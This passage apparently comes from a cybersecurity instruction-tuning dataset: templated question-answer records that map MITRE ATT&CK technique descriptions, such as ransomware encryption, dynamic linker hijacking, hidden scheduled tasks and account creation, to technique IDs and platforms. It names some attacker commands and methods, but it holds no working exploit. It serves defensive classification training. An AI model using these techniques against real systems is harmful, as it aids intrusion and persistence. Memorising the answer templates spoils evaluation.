    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Masquerading: Masquerade Task or Service (T1036.004);\nTechnique Masquerading: Masquerade Task or Service (T1036.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.",
      "answer": "The provided description is related to MITRE technique Masquerading: Masquerade Task or Service (T1036.004);\nTechnique Masquerading: Masquerade Task or Service (T1036.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
    "context": "",
    "output": "The provided description is related to MITRE technique Application Layer Protocol: Web Protocols (T1071.001);\nTechnique Application Layer Protocol: Web Protocols (T1071.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "answer": "The provided description is related to MITRE technique Application Layer Protocol: Web Protocols (T1071.001);\nTechnique Application Layer Protocol: Web Protocols (T1071.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as File and Directory Permissions Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR. \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Data Encrypted for Impact (T1486);\nTechnique Data Encrypted for Impact (T1486) is applicable to platforms: Linux,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as File and Directory Permissions Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR. \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.",
      "answer": "The provided description is related to MITRE technique Data Encrypted for Impact (T1486);\nTechnique Data Encrypted for Impact (T1486) is applicable to platforms: Linux,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may store data in \"fileless\" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage include the Windows Registry, event logs, or WMI repository.\n\nSimilar to fileless in-memory behaviors such as Reflective Code Loading and Process Injection, fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage.\n\nAdversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of Persistence) and collected data not yet exfiltrated from the victim (e.g., Local Data Staging). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.\n\nSome forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\\System32\\Wbem\\Repository`) or Registry (e.g., `%SystemRoot%\\System32\\Config`) physical files.",
    "context": "",
    "output": "The provided description is related to MITRE technique Obfuscated Files or Information: Fileless Storage (T1027.011);\nTechnique Obfuscated Files or Information: Fileless Storage (T1027.011) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may store data in \"fileless\" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage include the Windows Registry, event logs, or WMI repository.\n\nSimilar to fileless in-memory behaviors such as Reflective Code Loading and Process Injection, fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage.\n\nAdversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of Persistence) and collected data not yet exfiltrated from the victim (e.g., Local Data Staging). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.\n\nSome forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\\System32\\Wbem\\Repository`) or Registry (e.g., `%SystemRoot%\\System32\\Config`) physical files.",
      "answer": "The provided description is related to MITRE technique Obfuscated Files or Information: Fileless Storage (T1027.011);\nTechnique Obfuscated Files or Information: Fileless Storage (T1027.011) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Exfiltration Over C2 Channel (T1041);\nTechnique Exfiltration Over C2 Channel (T1041) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
      "answer": "The provided description is related to MITRE technique Exfiltration Over C2 Channel (T1041);\nTechnique Exfiltration Over C2 Channel (T1041) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",
    "context": "",
    "output": "The provided description is related to MITRE technique Phishing: Spearphishing Attachment (T1566.001);\nTechnique Phishing: Spearphishing Attachment (T1566.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",
      "answer": "The provided description is related to MITRE technique Phishing: Spearphishing Attachment (T1566.001);\nTechnique Phishing: Spearphishing Attachment (T1566.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.",
    "context": "",
    "output": "The provided description is related to MITRE technique User Execution: Malicious File (T1204.002);\nTechnique User Execution: Malicious File (T1204.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.",
      "answer": "The provided description is related to MITRE technique User Execution: Malicious File (T1204.002);\nTechnique User Execution: Malicious File (T1204.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.\n\nOn Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the <code>export</code> command, <code>setenv</code> function, or <code>putenv</code> function. Adversaries can also leverage Dynamic Linker Hijacking to export variables in a shell or set variables programmatically using higher level syntax such Python\u2019s <code>os.environ</code>.\n\nOn Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. <code>LD_PRELOAD</code> can be set via the environment variable or <code>/etc/ld.so.preload</code> file. Libraries specified by <code>LD_PRELOAD</code> are loaded and mapped into memory by <code>dlopen()</code> and <code>mmap()</code> respectively.  \n\nOn macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the <code>DYLD_INSERT_LIBRARIES</code> environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Hijack Execution Flow: Dynamic Linker Hijacking (T1574.006);\nTechnique Hijack Execution Flow: Dynamic Linker Hijacking (T1574.006) is applicable to platforms: macOS, Linux;\nTherefore, the given procedure description is related to platforms: macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.\n\nOn Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the <code>export</code> command, <code>setenv</code> function, or <code>putenv</code> function. Adversaries can also leverage Dynamic Linker Hijacking to export variables in a shell or set variables programmatically using higher level syntax such Python\u2019s <code>os.environ</code>.\n\nOn Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. <code>LD_PRELOAD</code> can be set via the environment variable or <code>/etc/ld.so.preload</code> file. Libraries specified by <code>LD_PRELOAD</code> are loaded and mapped into memory by <code>dlopen()</code> and <code>mmap()</code> respectively.  \n\nOn macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the <code>DYLD_INSERT_LIBRARIES</code> environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.",
      "answer": "The provided description is related to MITRE technique Hijack Execution Flow: Dynamic Linker Hijacking (T1574.006);\nTechnique Hijack Execution Flow: Dynamic Linker Hijacking (T1574.006) is applicable to platforms: macOS, Linux;\nTherefore, the given procedure description is related to platforms: macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. \n\nFor example, with a sufficient level of access, the Windows <code>net user /add</code> command can be used to create a local account. On macOS systems the <code>dscl -create</code> command can be used to create a local account. Local accounts may also be added to network devices, often via common Network Device CLI commands such as <code>username</code>, or to Kubernetes clusters using the `kubectl` utility.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
    "context": "",
    "output": "The provided description is related to MITRE technique Create Account: Local Account (T1136.001);\nTechnique Create Account: Local Account (T1136.001) is applicable to platforms: Linux,  Network,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. \n\nFor example, with a sufficient level of access, the Windows <code>net user /add</code> command can be used to create a local account. On macOS systems the <code>dscl -create</code> command can be used to create a local account. Local accounts may also be added to network devices, often via common Network Device CLI commands such as <code>username</code>, or to Kubernetes clusters using the `kubectl` utility.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
      "answer": "The provided description is related to MITRE technique Create Account: Local Account (T1136.001);\nTechnique Create Account: Local Account (T1136.001) is applicable to platforms: Linux,  Network,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: PowerShell (T1059.001);\nTechnique Command and Scripting Interpreter: PowerShell (T1059.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: PowerShell (T1059.001);\nTechnique Command and Scripting Interpreter: PowerShell (T1059.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated at utility could also be abused by adversaries (ex: At), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Scheduled Task/Job: Scheduled Task (T1053.005);\nTechnique Scheduled Task/Job: Scheduled Task (T1053.005) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated at utility could also be abused by adversaries (ex: At), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.",
      "answer": "The provided description is related to MITRE technique Scheduled Task/Job: Scheduled Task (T1053.005);\nTechnique Scheduled Task/Job: Scheduled Task (T1053.005) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. \n\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel. \n\nProtocol Tunneling may also be abused by adversaries during Dynamic Resolution. Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets. \n\nAdversaries may also leverage Protocol Tunneling in conjunction with Proxy and/or Protocol Impersonation to further conceal C2 communications and infrastructure.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Protocol Tunneling (T1572);\nTechnique Protocol Tunneling (T1572) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. \n\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel. \n\nProtocol Tunneling may also be abused by adversaries during Dynamic Resolution. Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets. \n\nAdversaries may also leverage Protocol Tunneling in conjunction with Proxy and/or Protocol Impersonation to further conceal C2 communications and infrastructure.",
      "answer": "The provided description is related to MITRE technique Protocol Tunneling (T1572);\nTechnique Protocol Tunneling (T1572) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as Cobalt Strike. Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.\n\nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).",
    "context": "",
    "output": "The provided description is related to MITRE technique Obtain Capabilities: Tool (T1588.002);\nTechnique Obtain Capabilities: Tool (T1588.002) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as Cobalt Strike. Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.\n\nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).",
      "answer": "The provided description is related to MITRE technique Obtain Capabilities: Tool (T1588.002);\nTechnique Obtain Capabilities: Tool (T1588.002) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
